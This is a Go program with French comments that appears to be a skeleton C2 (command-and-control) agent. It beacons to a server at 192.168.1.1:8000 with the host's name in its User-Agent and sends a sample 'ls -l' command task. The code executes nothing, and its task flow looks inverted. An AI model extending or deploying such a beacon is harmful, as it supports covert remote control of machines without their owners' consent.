package main

import (
	"bytes" // Package fournissant des fonctions pour travailler avec des bytes
	"encoding/json" // Package fournissant des fonctions pour encoder et décoder du JSON
	"fmt" // Package fournissant des fonctions pour formater et afficher des données
	"io/ioutil" // Package fournissant des fonctions pour lire et écrire des données
	"net/http" // Package fournissant des fonctions pour effectuer des requêtes HTTP
	"os" // Package fournissant des fonctions pour travailler avec les entrées/sorties système
)

// Task définit le modèle pour les tâches à exécuter
type Task struct {
	Type        string `json:"Type"` // Le type de tâche, ex: COMMAND
	User        string `json:"User"` // L'utilisateur associé à la tâche
	Name        string `json:"Name"` // Le nom de la tâche
	Description string `json:"Description"` // La description de la tâche
	Data        string `json:"Data"` // Les données associées à la tâche
	Timestamp   string `json:"Timestamp"` // Le timestamp associé à la tâche
	Id          string `json:"Id"` // L'ID de la tâche
	After       string `json:"After"` // Moment après lequel la tâche peut être exécutée
}

// Request définit le modèle pour les requêtes envoyées au serveur C2
type Request struct {
	NextRequestTime string `json:"NextRequestTime"` // Le temps pour la prochaine requête
	Tasks           []Task `json:"Tasks"` // Liste des tâches à exécuter
}

func main() {
	hostname, _ := os.Hostname() // Récupère le nom d'hôte de l'ordinateur
	agentVersion := "1.0.0" // Version de l'agent
	system := "Linux" // Système d'exploitation

	url := "http://192.168.1.1:8000/" // URL du serveur C2
	request := Request{ // Définit les données de la requête
		NextRequestTime: "2023-01-29T12:00:00", // Temps pour la prochaine requête
		Tasks: []Task{ // Liste des tâches à exécuter
			Task{
				Type:        "COMMAND", // Type de tâche: COMMAND
				User:        "JohnDoe", // Utilisateur: JohnDoe
				Name:        "Test Task", // Nom de la tâche: Test Task
				Description: "A test task", // Description de la tâche: A test task
				Data:        "ls -l", // Données: ls -l
				Timestamp:   "2023-01-29T12:00:00", 
				Id:          "1", // ID de la tâche: 1
				After:       "", // Moment après lequel la tâche peut être exécutée
			},
		},
	}
	requestBody, _ := json.Marshal(request) // Encode les données de la requête en JSON

	client := &http.Client{} // Crée un client HTTP
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(requestBody)) // Crée une requête HTTP
	if err != nil {
		fmt.Println("Error creating request:", err) // Affiche l'erreur
		return
	}

	req.Header.Add("User-Agent", fmt.Sprintf("Agent-C2-EX-MACHINA %s (%s) %s", agentVersion, system, hostname)) // Ajoute l'entête User-Agent
	req.Header.Add("Content-Type", "application/json") // Ajoute l'entête Content-Type

	resp, err := client.Do(req) // Envoie la requête
	if err != nil {
		fmt.Println("Error sending request:", err) // Affiche l'erreur
		return
	}
	defer resp.Body.Close() // Ferme le corps de la réponse

	responseBody, err := ioutil.ReadAll(resp.Body) // Lit le corps de la réponse
	if err != nil {
		fmt.Println("Error reading response body:", err) // Affiche l'erreur
		return
	}

	fmt.Println(string(responseBody)) // Affiche le corps de la réponse
}
